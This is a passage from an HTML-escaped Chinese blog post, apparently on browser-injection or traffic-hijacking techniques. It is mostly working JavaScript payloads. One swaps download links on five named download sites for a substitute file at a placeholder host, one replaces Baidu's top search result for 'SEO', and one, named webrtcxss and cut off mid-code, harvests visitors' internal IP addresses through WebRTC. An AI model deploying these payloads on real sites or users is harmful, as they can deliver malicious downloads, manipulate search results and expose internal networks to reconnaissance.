&lt;p&gt;还有很多，这里就不在列举了，下面我们就根据这些下载站来写替换的javascript代码。&lt;br&gt;先写段代码，让他判断当前的网址是否为下载站&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; downloadWebsite = [&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&#39;http://xiazai.zol.com.cn&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&#39;http://www.skycn.com&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&#39;http://www.onlinedown.net&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&#39;http://dl.pconline.com.cn&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&#39;http://rj.baidu.com&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ];  &lt;span class=&quot;comment&quot;&gt;//要替换的下载站url地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; replaceDownloadUrl = &lt;span class=&quot;string&quot;&gt;&quot;http://xxxx.com/download/soft.rar&quot;&lt;/span&gt;;   &lt;span class=&quot;comment&quot;&gt;//要替换的下载软件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;switch&lt;/span&gt;(location.origin)&amp;#123;  &lt;span class=&quot;comment&quot;&gt;//对当前的url进判断，是否为下载站，如果是则进入其操作函数里&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; downloadWebsite[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; download1 = &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.getElementById(&lt;span class=&quot;string&quot;&gt;&quot;downloadTop&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; download2 = &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.querySelectorAll(&lt;span class=&quot;string&quot;&gt;&quot;.down-alink a&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; download3 = &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.querySelectorAll(&lt;span class=&quot;string&quot;&gt;&quot;.down-alink01 a&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(download1 != &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt; &amp;amp;&amp;amp; download2.length != &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; download3.length != &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                download1.href = replaceDownloadUrl;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; j = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;j &amp;lt; download2.length;j++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    download2[j].href = replaceDownloadUrl;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; k = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;k &amp;lt; download3.length;k++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    download3[k].href = replaceDownloadUrl;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; downloadWebsite[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; download1 = &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.querySelectorAll(&lt;span class=&quot;string&quot;&gt;&quot;.ul_Address li a&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(download1.length != &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; j = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;j &amp;lt; download1.length;j++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    download1[j].href = replaceDownloadUrl;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; downloadWebsite[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;]:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; download1 = &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.querySelectorAll(&lt;span class=&quot;string&quot;&gt;&quot;.softinfoBox .meg a&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; download2 = &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.querySelectorAll(&lt;span class=&quot;string&quot;&gt;&quot;.downDz a&quot;&lt;/span&gt;);;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(download1.length != &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; download2.length != &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                download1[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;].href = replaceDownloadUrl;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; j = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;j &amp;lt; download2.length;j++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    download2[j].href = replaceDownloadUrl;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; downloadWebsite[&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;]:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; download1 = &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.querySelectorAll(&lt;span class=&quot;string&quot;&gt;&quot;.dlLinks-a a&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(download1.length != &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; j = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;j &amp;lt; download1.length;j++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    download1[j].href = replaceDownloadUrl;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; downloadWebsite[&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;]:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; download1 = &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.querySelectorAll(&lt;span class=&quot;string&quot;&gt;&quot;.fast_download&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; download2 = &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.querySelectorAll(&lt;span class=&quot;string&quot;&gt;&quot;.normal_download&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(download1.length != &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; download2.length != &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                download1[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;].href = replaceDownloadUrl;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                download2[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;].href = replaceDownloadUrl;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;)()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&quot;0x3-4-修改百排名&quot;&gt;&lt;a href=&quot;#0x3-4-修改百排名&quot; class=&quot;headerlink&quot; title=&quot;0x3.4 修改百排名&quot;&gt;&lt;/a&gt;0x3.4 修改百排名&lt;/h5&gt;&lt;p&gt;想做SEO的，可以使用此方法：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(location.origin == &lt;span class=&quot;string&quot;&gt;&quot;https://www.baidu.com&quot;&lt;/span&gt; &amp;amp;&amp;amp; location.pathname == &lt;span class=&quot;string&quot;&gt;&quot;/s&quot;&lt;/span&gt;)&amp;#123;    &lt;span class=&quot;comment&quot;&gt;//当时百度的搜索页面时&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.querySelectorAll(&lt;span class=&quot;string&quot;&gt;&quot;#content_left h3 a&quot;&lt;/span&gt;)[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;].href = &lt;span class=&quot;string&quot;&gt;&quot;http://360.cn/&quot;&lt;/span&gt;; &lt;span class=&quot;comment&quot;&gt;//替换第一个搜索结果为指定的url地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;)()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&quot;0x3-4-内网嗅探&quot;&gt;&lt;a href=&quot;#0x3-4-内网嗅探&quot; class=&quot;headerlink&quot; title=&quot;0x3.4 内网嗅探&quot;&gt;&lt;/a&gt;0x3.4 内网嗅探&lt;/h5&gt;&lt;p&gt;这个方法的篇幅比较多，放在下一章说明。下面是利用WebRTC来实现的获取内网IP地址：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; ipList = [];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; webrtcxss = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    webrtc        : &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;callback&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; ip_dups           = &amp;#123;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; RTCPeerConnection = &lt;span class=&quot;built_in&quot;&gt;window&lt;/span&gt;.RTCPeerConnection || &lt;span class=&quot;built_in&quot;&gt;window&lt;/span&gt;.mozRTCPeerConnection || &lt;span class=&quot;built_in&quot;&gt;window&lt;/span&gt;.webkitRTCPeerConnection;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; mediaConstraints  = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            optional: [&amp;#123;RtpDataChannels: &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&amp;#125;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; servers = &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;window&lt;/span&gt;.webkitRTCPeerConnection)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            servers = &amp;#123;iceServers: []&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; pc = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; RTCPeerConnection(servers, mediaConstraints);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        pc.onicecandidate = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;ice&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(ice.candidate)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; ip_regex        = &lt;span class=&quot;regexp&quot;&gt;/([0-9]&amp;#123;1,3&amp;#125;(\.[0-9]&amp;#123;1,3&amp;#125;)&amp;#123;3&amp;#125;)/&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; ip_addr         = ip_regex.exec(ice.candidate.candidate)[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(ip_dups[ip_addr] === &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                callback(ip_addr);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                ip_dups[ip_addr]    = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        pc.createDataChannel(&lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        pc.createOffer(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;result&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            pc.setLocalDescription(result, &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    getIp        : &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.webrtc(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span 